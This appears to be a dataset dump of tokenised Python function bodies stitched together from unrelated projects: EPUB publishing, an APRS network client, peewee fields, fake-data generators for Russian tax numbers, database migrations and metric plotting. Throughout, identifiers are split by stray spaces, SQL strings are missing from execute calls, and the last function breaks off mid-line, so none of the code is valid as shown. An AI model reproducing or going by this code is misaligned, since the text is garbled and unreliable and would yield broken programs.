def publish model ( cursor , model , publisher , message ) : publishers = publisher if isinstance ( publishers , list ) and len ( publishers ) > 1 : raise Value Error ( "Only one publisher is allowed. '{}' " "were given: {}" . format ( len ( publishers ) , publishers ) ) module ident , ident hash = insert metadata ( cursor , model , publisher , message ) for resource in getattr ( model , 'resources' , [ ] ) : insert resource file ( cursor , module ident , resource ) if isinstance ( model , Document ) : html = bytes ( cnxepub . Document Content Formatter ( model ) ) sha1 = hashlib . new ( 'sha1' , html ) . hexdigest ( ) cursor . execute ( "SELECT fileid FROM files WHERE sha1 = %s" , ( sha1 , ) ) try : fileid = cursor . fetchone ( ) [ 0 ] except Type Error : file args = { 'media type' : 'text/html' , 'data' : psycopg2 . Binary ( html ) , } cursor . execute ( , file args ) fileid = cursor . fetchone ( ) [ 0 ] args = { 'module ident' : module ident , 'filename' : 'index.cnxml.html' , 'fileid' : fileid , } cursor . execute ( , args ) elif isinstance ( model , Binder ) : tree = cnxepub . model to tree ( model ) tree = insert tree ( cursor , tree ) return ident hash
def publish composite model ( cursor , model , parent model , publisher , message ) : if not ( isinstance ( model , Composite Document ) or ( isinstance ( model , Binder ) and model . metadata . get ( 'type' ) == 'composite-chapter' ) ) : raise Value Error ( "This function only publishes Composite" "objects. '{}' was given." . format ( type ( model ) ) ) if issequence ( publisher ) and len ( publisher ) > 1 : raise Value Error ( "Only one publisher is allowed. '{}' " "were given: {}" . format ( len ( publisher ) , publisher ) ) module ident , ident hash = insert metadata ( cursor , model , publisher , message ) model . id , model . metadata [ 'version' ] = split ident hash ( ident hash ) model . set uri ( 'cnx-archive' , ident hash ) for resource in model . resources : insert resource file ( cursor , module ident , resource ) if isinstance ( model , Composite Document ) : html = bytes ( cnxepub . Document Content Formatter ( model ) ) fileid , = insert file ( cursor , io . Bytes IO ( html ) , 'text/html' ) file arg = { 'module ident' : module ident , 'parent ident hash' : parent model . ident hash , 'fileid' : fileid , } cursor . execute ( , file arg ) return ident hash
def publish ( request ) : if 'epub' not in request . POST : raise httpexceptions . HTTP Bad Request ( "Missing EPUB in POST body." ) is pre publication = asbool ( request . POST . get ( 'pre-publication' ) ) epub upload = request . POST [ 'epub' ] . file try : epub = cnxepub . EPUB . from file ( epub upload ) except : # noqa: E722 raise httpexceptions . HTTP Bad Request ( 'Format not recognized.' ) # Make a publication entry in the database for status checking # the publication. This also creates publication entries for all # of the content in the EPUB. with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : epub upload . seek ( 0 ) publication id , publications = add publication ( cursor , epub , epub upload , is pre publication ) # Poke at the publication & lookup its state. state , messages = poke publication state ( publication id ) response data = { 'publication' : publication id , 'mapping' : publications , 'state' : state , 'messages' : messages , } return response data
def bake content ( request ) : ident hash = request . matchdict [ 'ident hash' ] try : id , version = split ident hash ( ident hash ) except Ident Hash Error : raise httpexceptions . HTTP Not Found ( ) if not version : raise httpexceptions . HTTP Bad Request ( 'must specify the version' ) with db connect ( ) as db conn : with db conn . cursor ( ) as cursor : cursor . execute ( , ( ident hash , ) ) try : is binder , stateid , module ident = cursor . fetchone ( ) except Type Error : raise httpexceptions . HTTP Not Found ( ) if not is binder : raise httpexceptions . HTTP Bad Request ( '{} is not a book' . format ( ident hash ) ) if stateid == 5 : cursor . execute ( , ( module ident , ident hash ) ) else : cursor . execute ( , ( ident hash , ) )
def includeme ( config ) : global cache manager settings = config . registry . settings cache manager = Cache Manager ( * * parse cache config options ( settings ) )
def path to node ( tree , path ) : if path is None : return None node = tree for key in path : node = child by key ( node , key ) return node
def cli ( url , user agent ) : kwargs = { } if user agent : kwargs [ 'user agent' ] = user agent archive url = capture ( url , * * kwargs ) click . echo ( archive url )
def get channel image ( self , channel , img size = 300 , skip cache = False ) : from bs4 import Beautiful Soup from wikipedia . exceptions import Page Error import re import wikipedia wikipedia . set lang ( 'fr' ) if not channel : LOGGER . error ( 'Channel is not set. Could not retrieve image.' ) return # Check if the image is in cache if channel in self . cache channel img and not skip cache : img = self . cache channel img [ channel ] LOGGER . debug ( 'Cache hit: %s -> %s' , channel , img ) return img channel info = self . get channel info ( channel ) query = channel info [ 'wiki page' ] if not query : LOGGER . debug ( 'Wiki page is not set for channel %s' , channel ) return LOGGER . debug ( 'Query: %s' , query ) # If there is a max image size defined use it. if 'max img size' in channel info : if img size > channel info [ 'max img size' ] : LOGGER . info ( 'Requested image size is bigger than the max, ' 'setting it to %s' , channel info [ 'max img size' ] ) img size = channel info [ 'max img size' ] try : page = wikipedia . page ( query ) LOGGER . debug ( 'Wikipedia article title: %s' , page . title ) soup = Beautiful Soup ( page . html ( ) , 'html.parser' ) images = soup . find all ( 'img' ) img src = None for i in images : if i [ 'alt' ] . startswith ( 'Image illustrative' ) : img src = re . sub ( r'\d+px' , '{}px' . format ( img size ) , i [ 'src' ] ) img = 'https:{}' . format ( img src ) if img src else None # Cache result self . cache channel img [ channel ] = img return img except Page Error : LOGGER . error ( 'Could not fetch channel image for %s' , channel )
def forwards ( self , orm ) : # Note: Remember to use orm['appname.Model Name'] rather than "from appname.models..." for translation in orm [ 'people.Person Translation' ] . objects . all ( ) : if translation . language in [ 'en' , 'de' ] : translation . roman first name = translation . first name translation . roman last name = translation . last name else : translation . non roman first name = translation . first name translation . non roman last name = translation . last name translation . save ( )
def forwards ( self , orm ) : for translation in orm [ 'people.Person Translation' ] . objects . all ( ) : translation . person . roman first name = translation . roman first name translation . person . roman last name = translation . roman last name translation . person . non roman first name = translation . non roman first name translation . person . non roman last name = translation . non roman last name translation . person . save ( )
def smixins ( self , name ) : return ( self . mixins [ name ] if name in self . mixins else False )
def blocks ( self , name ) : i = len ( self ) while i >= 0 : i -= 1 if name in self [ i ] [ ' names ' ] : for b in self [ i ] [ ' blocks ' ] : r = b . raw ( ) if r and r == name : return b else : for b in self [ i ] [ ' blocks ' ] : r = b . raw ( ) if r and name . startswith ( r ) : b = utility . blocksearch ( b , name ) if b : return b return False
def user and project from git ( self , options , arg0 = None , arg1 = None ) : user , project = self . user project from option ( options , arg0 , arg1 ) if user and project : return user , project try : remote = subprocess . check output ( [ 'git' , 'config' , '--get' , 'remote.{0}.url' . format ( options . git remote ) ] ) except subprocess . Called Process Error : return None , None except Windows Error : print ( "git binary not found." ) exit ( 1 ) else : return self . user project from remote ( remote )
def fetch tags dates ( self ) : if self . options . verbose : print ( "Fetching dates for {} tags..." . format ( len ( self . filtered tags ) ) ) def worker ( tag ) : self . get time of tag ( tag ) # Async fetching tags: threads = [ ] max threads = 50 cnt = len ( self . filtered tags ) for i in range ( 0 , ( cnt // max threads ) + 1 ) : for j in range ( max threads ) : idx = i * 50 + j if idx == cnt : break t = threading . Thread ( target = worker , args = ( self . filtered tags [ idx ] , ) ) threads . append ( t ) t . start ( ) if self . options . verbose > 2 : print ( "." , end = "" ) for t in threads : t . join ( ) if self . options . verbose > 2 : print ( "." ) if self . options . verbose > 1 : print ( "Fetched dates for {} tags." . format ( len ( self . tag times dict ) ) )
def fetch and filter tags ( self ) : self . all tags = self . fetcher . get all tags ( ) self . filtered tags = self . get filtered tags ( self . all tags ) self . fetch tags dates ( )
def to decimal ( text ) : if not isinstance ( text , string type ) : raise Type Error ( "expected str or unicode, %s given" % type ( text ) ) if findall ( r"[\x00-\x20\x7c-\xff]" , text ) : raise Value Error ( "invalid character in sequence" ) text = text . lstrip ( '!' ) decimal = 0 length = len ( text ) - 1 for i , char in enumerate ( text ) : decimal += ( ord ( char ) - 33 ) * ( 91 ** ( length - i ) ) return decimal if text != '' else 0
def passcode ( callsign ) : assert isinstance ( callsign , str ) callsign = callsign . split ( '-' ) [ 0 ] . upper ( ) code = 0x73e2 for i , char in enumerate ( callsign ) : code ^= ord ( char ) << ( 8 if not i % 2 else 0 ) return code & 0x7fff
def set filter ( self , filter text ) : self . filter = filter text self . logger . info ( "Setting filter to: %s" , self . filter ) if self . connected : self . sendall ( "#filter %s\r\n" % self . filter )
def set login ( self , callsign , passwd = "-1" , skip login = False ) : self . dict . update ( locals ( ) )
def connect ( self ) : self . logger . info ( "Attempting connection to %s:%s" , self . server [ 0 ] , self . server [ 1 ] ) try : self . open socket ( ) peer = self . sock . getpeername ( ) self . logger . info ( "Connected to %s" , str ( peer ) ) # 5 second timeout to receive server banner self . sock . setblocking ( 1 ) self . sock . settimeout ( 5 ) self . sock . setsockopt ( socket . SOL SOCKET , socket . SO KEEPALIVE , 1 ) banner = self . sock . recv ( 512 ) if is py3 : banner = banner . decode ( 'latin-1' ) if banner [ 0 ] == "#" : self . logger . debug ( "Banner: %s" , banner . rstrip ( ) ) else : raise Connection Error ( "invalid banner from server" ) except Connection Error as e : self . logger . error ( str ( e ) ) self . close ( ) raise except ( socket . error , socket . timeout ) as e : self . close ( ) self . logger . error ( "Socket error: %s" % str ( e ) ) if str ( e ) == "timed out" : raise Connection Error ( "no banner from server" ) else : raise Connection Error ( e ) self . connected = True
def send login ( self ) : login str = "user {0} pass {1} vers aprslib {3}{2}\r\n" login str = login str . format ( self . callsign , self . passwd , ( " filter " + self . filter ) if self . filter != "" else "" , version ) self . logger . info ( "Sending login information" ) try : self . sendall ( login str ) self . sock . settimeout ( 5 ) test = self . sock . recv ( len ( login str ) + 100 ) if is py3 : test = test . decode ( 'latin-1' ) test = test . rstrip ( ) self . logger . debug ( "Server: %s" , test ) , , callsign , status , = test . split ( ' ' , 4 ) if callsign == "" : raise Login Error ( "Server responded with empty callsign???" ) if callsign != self . callsign : raise Login Error ( "Server: %s" % test ) if status != "verified," and self . passwd != "-1" : raise Login Error ( "Password is incorrect" ) if self . passwd == "-1" : self . logger . info ( "Login successful (receive only)" ) else : self . logger . info ( "Login successful" ) except Login Error as e : self . logger . error ( str ( e ) ) self . close ( ) raise except : self . close ( ) self . logger . error ( "Failed to login" ) raise Login Error ( "Failed to login" )
def socket readlines ( self , blocking = False ) : try : self . sock . setblocking ( 0 ) except socket . error as e : self . logger . error ( "socket error when setblocking(0): %s" % str ( e ) ) raise Connection Drop ( "connection dropped" ) while True : short buf = b'' newline = b'\r\n' select . select ( [ self . sock ] , [ ] , [ ] , None if blocking else 0 ) try : short buf = self . sock . recv ( 4096 ) # sock.recv returns empty if the connection drops if not short buf : self . logger . error ( "socket.recv(): returned empty" ) raise Connection Drop ( "connection dropped" ) except socket . error as e : self . logger . error ( "socket error on recv(): %s" % str ( e ) ) if "Resource temporarily unavailable" in str ( e ) : if not blocking : if len ( self . buf ) == 0 : break self . buf += short buf while newline in self . buf : line , self . buf = self . buf . split ( newline , 1 ) yield line
def db value ( self , value ) : # ensure we have a valid UUID if not isinstance ( value , UUID ) : value = UUID ( value ) # reconstruct for optimal indexing parts = str ( value ) . split ( "-" ) reordered = '' . join ( [ parts [ 2 ] , parts [ 1 ] , parts [ 0 ] , parts [ 3 ] , parts [ 4 ] ] ) value = binascii . unhexlify ( reordered ) return super ( Ordered UUID Field , self ) . db value ( value )
def python value ( self , value ) : value = super ( Ordered UUID Field , self ) . python value ( value ) u = binascii . b2a hex ( value ) value = u [ 8 : 16 ] + u [ 4 : 8 ] + u [ 0 : 4 ] + u [ 16 : 22 ] + u [ 22 : 32 ] return UUID ( value . decode ( ) )
def db value ( self , value ) : value = self . transform value ( value ) return self . hhash . encrypt ( value , salt size = self . salt size , rounds = self . rounds )
def python value ( self , value ) : value = coerce to bytes ( value ) obj = Hash Value ( value ) obj . field = self return obj
def disconnect ( self ) : for name , connection in self . items ( ) : if not connection . is closed ( ) : connection . close ( )
def get database ( self , model ) : for router in self . routers : r = router . get database ( model ) if r is not None : return r return self . get ( 'default' )
def to cursor ref ( self ) : fields = self . meta . get primary keys ( ) assert fields values = { field . name : self . data [ field . name ] for field in fields } return values
def apply filters ( self , query , filters ) : assert isinstance ( query , peewee . Query ) assert isinstance ( filters , dict )
def list ( self , filters , cursor , count ) : assert isinstance ( filters , dict ) , "expected filters type 'dict'" assert isinstance ( cursor , dict ) , "expected cursor type 'dict'" # start with our base query query = self . get query ( ) assert isinstance ( query , peewee . Query ) # XXX: convert and apply user specified filters #filters = {field.name: cursor[field.name] for field in fields} #query.where( paginator = self . get paginator ( ) assert isinstance ( paginator , Pagination ) # always include an extra row for next cursor position count += 1 # apply pagination to query pquery = paginator . filter query ( query , cursor , count ) items = [ item for item in pquery ] # determine next cursor position next item = items . pop ( 1 ) next cursor = next item . to cursor ref ( ) return items , next cursor
def retrieve ( self , cursor ) : assert isinstance ( cursor , dict ) , "expected cursor type 'dict'" # look for record in query query = self . get query ( ) assert isinstance ( query , peewee . Query ) query return query . get ( * * cursor )
def refresh ( self , accept = MEDIA TYPE TAXII V20 ) : self . refresh information ( accept ) self . refresh collections ( accept )
def validate server ( self ) : if not self . title : msg = "No 'title' in Server Discovery for request '{}'" raise Validation Error ( msg . format ( self . url ) )
def refresh ( self ) : response = self . raw = self . conn . get ( self . url ) self . populate fields ( * * response ) self . loaded = True
def empty like ( array , dtype = None ) : array = numpy . asarray ( array ) if dtype is None : dtype = array . dtype return anonymousmemmap ( array . shape , dtype )
def full like ( array , value , dtype = None ) : shared = empty like ( array , dtype ) shared [ : ] = value return shared
def full ( shape , value , dtype = 'f8' ) : shared = empty ( shape , dtype ) shared [ : ] = value return shared
def flatten dtype ( dtype , next = None ) : types = [ ] if next is None : next = [ 0 , '' ] primary = True else : primary = False prefix = next [ 1 ] if dtype . names is None : for i in numpy . ndindex ( dtype . shape ) : if dtype . base == dtype : types . append ( ( '%s%s' % ( prefix , simplerepr ( i ) ) , dtype ) ) next [ 0 ] += 1 else : next [ 1 ] = '%s%s' % ( prefix , simplerepr ( i ) ) types . extend ( flatten dtype ( dtype . base , next ) ) else : for field in dtype . names : typ fields = dtype . fields [ field ] if len ( prefix ) > 0 : next [ 1 ] = prefix + '.' + field else : next [ 1 ] = '' + field flat dt = flatten dtype ( typ fields [ 0 ] , next ) types . extend ( flat dt ) next [ 1 ] = prefix if primary : return numpy . dtype ( types ) else : return types
def Meta Ordered ( parallel , done , turnstile ) : class Ordered : def init ( self , iterref ) : if parallel . master : done [ ... ] = 0 self . iterref = iterref parallel . barrier ( ) @ classmethod def abort ( self ) : turnstile . release ( ) def enter ( self ) : while self . iterref != done : pass turnstile . acquire ( ) return self def exit ( self , * args ) : done [ ... ] += 1 turnstile . release ( ) return Ordered
def kill all ( self ) : for pid in self . children : try : os . kill ( pid , signal . SIGTRAP ) except OS Error : continue self . join ( )
def abort ( self ) : self . mutex . release ( ) self . turnstile . release ( ) self . mutex . release ( ) self . turnstile2 . release ( )
def read ( self , n ) : while len ( self . pool ) < n : self . cur = self . files . next ( ) self . pool = numpy . append ( self . pool , self . fetch ( self . cur ) , axis = 0 ) rt = self . pool [ : n ] if n == len ( self . pool ) : self . pool = self . fetch ( None ) else : self . pool = self . pool [ n : ] return rt
def adapt ( cls , source , template ) : if not isinstance ( template , packarray ) : raise Type Error ( 'template must be a packarray' ) return cls ( source , template . start , template . end )
def year ( past = False , min delta = 0 , max delta = 20 ) : return dt . date . today ( ) . year + delta ( past , min delta , max delta )
def date ( past = False , min delta = 0 , max delta = 20 ) : timedelta = dt . timedelta ( days = delta ( past , min delta , max delta ) ) return dt . date . today ( ) + timedelta
def street number ( ) : length = int ( random . choice ( string . digits [ 1 : 6 ] ) ) return '' . join ( random . sample ( string . digits , length ) )
def zip code ( ) : format = '#####' if random . random ( ) >= 0.5 : format = '#####-####' result = '' for item in format : if item == '#' : result += str ( random . randint ( 0 , 9 ) ) else : result += item return result
def job title ( ) : result = random . choice ( get dictionary ( 'job titles' ) ) . strip ( ) result = result . replace ( '#{N}' , job title suffix ( ) ) return result
def body ( quantity = 2 , separator = '\n\n' , wrap start = '' , wrap end = '' , html = False , sentences quantity = 3 , as list = False ) : return lorem ipsum . paragraphs ( quantity = quantity , separator = separator , wrap start = wrap start , wrap end = wrap end , html = html , sentences quantity = sentences quantity , as list = as list )
def money ( min = 0 , max = 10 ) : value = random . choice ( range ( min * 100 , max * 100 ) ) return "%1.2f" % ( float ( value ) / 100 )
def words ( quantity = 10 , as list = False ) : global words if not words : words = ' ' . join ( get dictionary ( 'lorem ipsum' ) ) . lower ( ) . replace ( '\n' , '' ) words = re . sub ( r'\.|,|;/' , '' , words ) words = words . split ( ' ' ) result = random . sample ( words , quantity ) if as list : return result else : return ' ' . join ( result )
def title ( words quantity = 4 ) : result = words ( quantity = words quantity ) result += random . choice ( '?.!' ) return result . capitalize ( )
def sentences ( quantity = 2 , as list = False ) : result = [ sntc . strip ( ) for sntc in random . sample ( get dictionary ( 'lorem ipsum' ) , quantity ) ] if as list : return result else : return ' ' . join ( result )
def paragraph ( separator = '\n\n' , wrap start = '' , wrap end = '' , html = False , sentences quantity = 3 ) : return paragraphs ( quantity = 1 , separator = separator , wrap start = wrap start , wrap end = wrap end , html = html , sentences quantity = sentences quantity )
def paragraphs ( quantity = 2 , separator = '\n\n' , wrap start = '' , wrap end = '' , html = False , sentences quantity = 3 , as list = False ) : if html : wrap start = '<p>' wrap end = '</p>' separator = '\n\n' result = [ ] try : for in xrange ( 0 , quantity ) : result . append ( wrap start + sentences ( sentences quantity ) + wrap end ) # Python 3 compatibility except Name Error : for in range ( 0 , quantity ) : result . append ( wrap start + sentences ( sentences quantity ) + wrap end ) if as list : return result else : return separator . join ( result )
def characters ( quantity = 10 ) : line = map ( to lower alpha only , '' . join ( random . sample ( get dictionary ( 'lorem ipsum' ) , quantity ) ) ) return '' . join ( line ) [ : quantity ]
def text ( what = "sentence" , * args , * * kwargs ) : if what == "character" : return character ( * args , * * kwargs ) elif what == "characters" : return characters ( * args , * * kwargs ) elif what == "word" : return word ( * args , * * kwargs ) elif what == "words" : return words ( * args , * * kwargs ) elif what == "sentence" : return sentence ( * args , * * kwargs ) elif what == "sentences" : return sentences ( * args , * * kwargs ) elif what == "paragraph" : return paragraph ( * args , * * kwargs ) elif what == "paragraphs" : return paragraphs ( * args , * * kwargs ) elif what == "title" : return title ( * args , * * kwargs ) else : raise Name Error ( 'No such method' )
def account number ( ) : account = [ random . randint ( 1 , 9 ) for in range ( 20 ) ] return "" . join ( map ( str , account ) )
def bik ( ) : return '04' + '' . join ( [ str ( random . randint ( 1 , 9 ) ) for in range ( 5 ) ] ) + str ( random . randint ( 0 , 49 ) + 50 )
def legal inn ( ) : mask = [ 2 , 4 , 10 , 3 , 5 , 9 , 4 , 6 , 8 ] inn = [ random . randint ( 1 , 9 ) for in range ( 10 ) ] weighted = [ v * mask [ i ] for i , v in enumerate ( inn [ : - 1 ] ) ] inn [ 9 ] = sum ( weighted ) % 11 % 10 return "" . join ( map ( str , inn ) )
def legal ogrn ( ) : ogrn = "" . join ( map ( str , [ random . randint ( 1 , 9 ) for in range ( 12 ) ] ) ) ogrn += str ( ( int ( ogrn ) % 11 % 10 ) ) return ogrn
def person inn ( ) : mask11 = [ 7 , 2 , 4 , 10 , 3 , 5 , 9 , 4 , 6 , 8 ] mask12 = [ 3 , 7 , 2 , 4 , 10 , 3 , 5 , 9 , 4 , 6 , 8 ] inn = [ random . randint ( 1 , 9 ) for in range ( 12 ) ] # get the 11th digit of the INN weighted11 = [ v * mask11 [ i ] for i , v in enumerate ( inn [ : - 2 ] ) ] inn [ 10 ] = sum ( weighted11 ) % 11 % 10 # get the 12th digit of the INN weighted12 = [ v * mask12 [ i ] for i , v in enumerate ( inn [ : - 1 ] ) ] inn [ 11 ] = sum ( weighted12 ) % 11 % 10 return "" . join ( map ( str , inn ) )
def password ( at least = 6 , at most = 12 , lowercase = True , uppercase = True , digits = True , spaces = False , punctuation = False ) : return text ( at least = at least , at most = at most , lowercase = lowercase , uppercase = uppercase , digits = digits , spaces = spaces , punctuation = punctuation )
def forwards ( self , orm ) : # Note: Don't use "from appname.models import Model Name".  # Use orm.Model Name to refer to models in this application, # and orm['appname.Model Name'] for models in other applications. print ( "Updating: Jednostka Administracyjna" ) ja akt stan = orm . Jednostka Administracyjna . objects . all ( ) . aggregate ( Max ( 'stan na' ) ) [ 'stan na max' ] orm . Jednostka Administracyjna . objects . filter ( stan na exact = ja akt stan ) . update ( aktywny = True ) orm . Jednostka Administracyjna . objects . exclude ( stan na exact = ja akt stan ) . update ( aktywny = False ) print ( "Updating: Miejscowosc" ) m akt stan = orm . Miejscowosc . objects . all ( ) . aggregate ( Max ( 'stan na' ) ) [ 'stan na max' ] orm . Miejscowosc . objects . filter ( stan na exact = m akt stan ) . update ( aktywny = True ) orm . Miejscowosc . objects . exclude ( stan na exact = m akt stan ) . update ( aktywny = False ) print ( "Updating: Rodzaj Miejsowosci" ) rm akt stan = orm . Rodzaj Miejsowosci . objects . all ( ) . aggregate ( Max ( 'stan na' ) ) [ 'stan na max' ] orm . Rodzaj Miejsowosci . objects . filter ( stan na exact = rm akt stan ) . update ( aktywny = True ) orm . Rodzaj Miejsowosci . objects . exclude ( stan na exact = rm akt stan ) . update ( aktywny = False ) print ( "Updating: Ulica" ) u akt stan = orm . Ulica . objects . all ( ) . aggregate ( Max ( 'stan na' ) ) [ 'stan na max' ] orm . Ulica . objects . filter ( stan na exact = u akt stan ) . update ( aktywny = True ) orm . Ulica . objects . exclude ( stan na exact = u akt stan ) . update ( aktywny = False )
def forwards ( self , orm ) : # Note: Don't use "from appname.models import Model Name".  # Use orm.Model Name to refer to models in this application, # and orm['appname.Model Name'] for models in other applications. LEN TYPE = { 7 : 'GMI' , 4 : 'POW' , 2 : 'WOJ' , } for ja in orm . Jednostka Administracyjna . objects . all ( ) : ja . typ = LEN TYPE [ len ( ja . id ) ] ja . save ( )
def extract diff sla from config file ( obj , options file ) : rule strings = { } config obj = Config Parser . Config Parser ( ) config obj . optionxform = str config obj . read ( options file ) for section in config obj . sections ( ) : rule strings , kwargs = get rule strings ( config obj , section ) for ( key , val ) in rule strings . iteritems ( ) : set sla ( obj , section , key , val )
def set sla ( obj , metric , sub metric , rules ) : if not hasattr ( obj , 'sla map' ) : return False rules list = rules . split ( ) for rule in rules list : if '<' in rule : stat , threshold = rule . split ( '<' ) sla = SLA ( metric , sub metric , stat , threshold , 'lt' ) elif '>' in rule : stat , threshold = rule . split ( '>' ) sla = SLA ( metric , sub metric , stat , threshold , 'gt' ) else : if hasattr ( obj , 'logger' ) : obj . logger . error ( 'Unsupported SLA type defined : ' + rule ) sla = None obj . sla map [ metric ] [ sub metric ] [ stat ] = sla if hasattr ( obj , 'sla list' ) : obj . sla list . append ( sla ) # TODO : remove this once report has grading done in the metric tables return True
def graph csv ( output directory , resource path , csv file , plot title , output filename , y label = None , precision = None , graph height = "600" , graph width = "1500" ) : if not os . path . getsize ( csv file ) : return False , "" y label = y label or plot title div id = str ( random . random ( ) ) div string = "<div id=\"%s\" style=\"width:%spx; height:%spx;\"></div>" % ( div id , graph width , graph height ) script string = + div id + + resource path + '/' + os . path . basename ( csv file ) + + y label + + plot title + + y label + with open ( os . path . join ( output directory , output filename + '.div' ) , 'w' ) as div file : div file . write ( div string + script string ) # TODO(ritesh): Also generate PN Gs if someone needs them separately return True , os . path . join ( output directory , output filename + '.div' )
def convert to G ( self , word ) : value = 0.0 if word [ - 1 ] == 'G' or word [ - 1 ] == 'g' : value = float ( word [ : - 1 ] ) elif word [ - 1 ] == 'M' or word [ - 1 ] == 'm' : value = float ( word [ : - 1 ] ) / 1000.0 elif word [ - 1 ] == 'K' or word [ - 1 ] == 'k' : value = float ( word [ : - 1 ] ) / 1000.0 / 1000.0 else : # No unit value = float ( word ) / 1000.0 / 1000.0 / 1000.0 return str ( value )
def plot diff ( self , graphing library = 'matplotlib' ) : diff datasource = sorted ( set ( self . reports [ 0 ] . datasource ) & set ( self . reports [ 1 ] . datasource ) ) graphed = False for submetric in diff datasource : baseline csv = naarad . utils . get default csv ( self . reports [ 0 ] . local location , ( submetric + '.percentiles' ) ) current csv = naarad . utils . get default csv ( self . reports [ 1 ] . local location , ( submetric + '.percentiles' ) ) if ( not ( naarad . utils . is valid file ( baseline csv ) & naarad . utils . is valid file ( current csv ) ) ) : continue baseline plot = PD ( input csv = baseline csv , csv column = 1 , series name = submetric , y label = submetric , precision = None , graph height = 600 , graph width = 1200 , graph type = 'line' , plot label = 'baseline' , x label = 'Percentiles' ) current plot = PD ( input csv = current csv , csv column = 1 , series name = submetric , y label = submetric , precision = None , graph height = 600 , graph width = 1200 , graph type = 'line' , plot label = 'current' , x label = 'Percentiles' ) graphed , div file = Diff . graphing modules [ graphing library ] . graph data on the same graph ( [ baseline plot , current plot ] , os . path . join ( self . output directory , self . resource path ) , self . resource path , ( submetric + '.diff' ) ) if graphed : self . plot files . append ( div file ) return True
def check sla ( self , sla , diff metric ) : try : if sla . display is '%' : diff val = float ( diff metric [ 'percent diff' ] ) else : diff val = float ( diff metric [ 'absolute diff' ] ) except Value Error : return False if not ( sla . check sla passed ( diff val ) ) : self . sla failures += 1 self . sla failure list . append ( Diff SLA Failure ( sla , diff metric ) ) return True
def plot timeseries ( self , graphing library = 'matplotlib' ) : if self . groupby : plot data = { } # plot time series data for submetrics for out csv in sorted ( self . csv files , reverse = True ) : csv filename = os . path . basename ( out csv ) transaction name = "." . join ( csv filename . split ( '.' ) [ 1 : - 1 ] ) if transaction name in self . anomalies . keys ( ) : highlight regions = self . anomalies [ transaction name ] else : highlight regions = None # The last element is .csv, don't need that in the name of the chart column = csv filename . split ( '.' ) [ - 2 ] transaction name = ' ' . join ( csv filename . split ( '.' ) [ 1 : - 2 ] ) plot = PD ( input csv = out csv , csv column = 1 , series name = transaction name + '.' + column , y label = column + ' (' + self . sub metric description [ column ] + ')' , precision = None , graph height = 500 , graph width = 1200 , graph type = 'line' , highlight regions = highlight regions ) if transaction name in plot data : plot data [ transaction name ] . append ( plot ) else : plot data [ transaction name ] = [ plot ] for transaction in plot data : graphed , div file = Metric . graphing modules [ graphing library ] . graph data ( plot data [ transaction ] , self . resource directory , self . resource path , self . label + '.' + transaction ) if graphed : self . plot files . append ( div file ) else : graphed = False for out csv in self . csv files : csv filename = os . path . basename ( out csv ) transaction name = "." . join ( csv filename . split ( '.' ) [ 1 : - 1 ] ) if transaction name in self . anomalies . keys ( ) : highlight regions = self . anomalies [ transaction name ] else : highlight regions = None # The last element is .csv, don't need that in the name of the chart column = self . csv column map [ out csv ] column = naarad . utils . sanitize string ( column ) graph title = '.' . join ( csv filename . split ( '.' ) [ 0 : - 1 ] ) if self . sub metric description and column in self . sub metric description . keys ( ) : graph title += ' (' + self . sub metric description [ column ] + ')' if self . sub metric unit and column in self . sub metric unit . keys ( ) : plot data = [ PD ( input csv = out csv , csv column = 1 , series name = graph title , y label = column + ' (' + self . sub metric unit [ column ] + ')' , precision = None , graph height = 600 , graph width = 1200 , graph type = 'line' , highlight regions = highlight regions ) ] else : plot data = [ PD ( input csv = out csv , csv column = 1 , series name = graph title , y label = column , precision = None , graph height = 600 , graph width = 1200 , graph type = 'line' , highlight regions = highlight regions ) ] graphed , div file = Metric . graphing modules [ graphing library ] . graph data ( plot data , self . resource directory , self . resource path , graph title ) if graphed : self . plot files . append ( div file ) return True
def check important sub metrics ( self , sub metric ) : if not self . important sub metrics : return False if sub metric in self . important sub metrics : return True items = sub metric . split ( '.' ) if items [ - 1 ] in self . important sub metrics : return True return False
def plot cdf ( self , graphing library = 'matplotlib' ) : graphed = False for percentile csv in self . percentiles files : csv filename = os . path . basename ( percentile csv ) # The last element is .csv, don't need that in the name of the chart column = self . csv column map [ percentile csv . replace ( ".percentiles." , "." ) ] if not self . check important sub metrics ( column ) : continue column = naarad . utils . sanitize string ( column ) graph title = '.' . join ( csv filename . split ( '.' ) [ 0 : - 1 ] ) if self . sub metric description and column in self . sub metric description . keys ( ) : graph title += ' (' + self . sub metric description [ column ] + ')' if self . sub metric unit and column in self . sub metric unit . keys ( ) : plot data = [ PD ( input csv = percentile csv , csv column = 1 , series name = graph title , x label = 'Percentiles' , y label = column + ' (' + self . sub metric unit [ column ] + ')' , precision = None , graph height = 600 , graph width = 1200 , graph type = 'line' ) ] else : plot data = [ PD ( input csv = percentile csv , csv column = 1 , series name = graph title , x label = 'Percentiles' , y label = column , precision = None , graph height = 600 , graph width = 1200 , graph type = 'line' ) ] graphed , div file = Metric . graphing modules [ graphing library ] . graph data on the same graph ( plot data , self . resource directory , self . resource path , graph title ) if graphed : self . plot files . append ( div file ) return True
def parse innotop mode b ( self ) : with open ( self . infile , 'r' ) as infh : # Pre processing to figure out different headers max row quot = 0 valrow = - 1 thisrowcolumns = { } data = { } while True : line1 = infh . readline ( ) words = line1 . split ( ) # special case for -I (iostat) option # skipping all the 'thread' lines if words [ 1 ] == "thread" and self . metric type == "INNOTOP-I" : while True : line1 = infh . readline ( ) words = line1 . split ( ) if naarad . utils . is number ( words [ 1 ] ) : line1 = infh . readline ( ) else : break if words [ 1 ] == "thread" and self . metric type == "INNOTOP-R" : break # Skip next line infh . readline ( ) last ts = words [ 0 ] . strip ( ) . replace ( 'T' , ' ' ) if not naarad . utils . is number ( words [ 1 ] ) : thisrowcolumns [ max row quot ] = words [ 1 : ] for column in words [ 1 : ] : if self . options and column not in self . options : continue data [ column ] = [ ] if self . metric type == "INNOTOP-I" : data [ "check pt age" ] = [ ] max row quot += 1 else : break # infh.seek(0) # Real Processing for line in infh : l = line . strip ( ) . split ( ' ' , 1 ) if len ( l ) <= 1 : continue ts = l [ 0 ] . strip ( ) . replace ( 'T' , ' ' ) if not ts == last ts : last ts = ts valrow = - 1 try : words = l [ 1 ] . strip ( ) . split ( '\t' ) except Index Error : logger . warn ( "Bad line: %s" , line ) continue # special case for -I (iostat) option # skipping all the 'thread' lines if words [ 0 ] == "thread" or ( naarad . utils . is number ( words [ 0 ] ) and "thread" in words [ 1 ] ) : continue if naarad . utils . is number ( words [ 0 ] ) : valrow += 1 quot = valrow % max row quot # Special case for -R, skipping all 'thread' value lines if 